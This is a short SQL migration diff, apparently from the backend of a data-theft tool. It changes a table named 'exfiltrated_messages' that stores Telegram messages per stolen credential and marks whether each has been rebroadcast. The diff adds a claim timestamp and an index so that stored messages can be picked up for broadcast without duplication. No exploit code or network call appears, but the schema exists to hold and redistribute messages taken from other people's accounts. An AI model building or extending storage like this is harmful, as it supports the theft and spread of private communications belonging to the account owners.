@@ -28,12 +28,14 @@ CREATE TABLE IF NOT EXISTS exfiltrated_messages (
     media_type TEXT DEFAULT 'text',
     file_meta JSONB DEFAULT '{}'::jsonb,
     is_broadcasted BOOLEAN DEFAULT FALSE,
+    broadcast_claimed_at TIMESTAMPTZ DEFAULT NULL,
     created_at TIMESTAMPTZ DEFAULT NOW()
 );
 
 -- Indexes
 CREATE INDEX IF NOT EXISTS idx_messages_credential_id ON exfiltrated_messages(credential_id);
 CREATE INDEX IF NOT EXISTS idx_messages_is_broadcasted ON exfiltrated_messages(is_broadcasted) WHERE is_broadcasted = FALSE;
+CREATE INDEX IF NOT EXISTS idx_exfiltrated_messages_claimed ON exfiltrated_messages(is_broadcasted, broadcast_claimed_at);
 -- Unique constraint to prevent duplicate messages per credential
 ALTER TABLE exfiltrated_messages DROP CONSTRAINT IF EXISTS unique_msg_per_credential;
 ALTER TABLE exfiltrated_messages ADD CONSTRAINT unique_msg_per_credential UNIQUE (credential_id, telegram_msg_id);
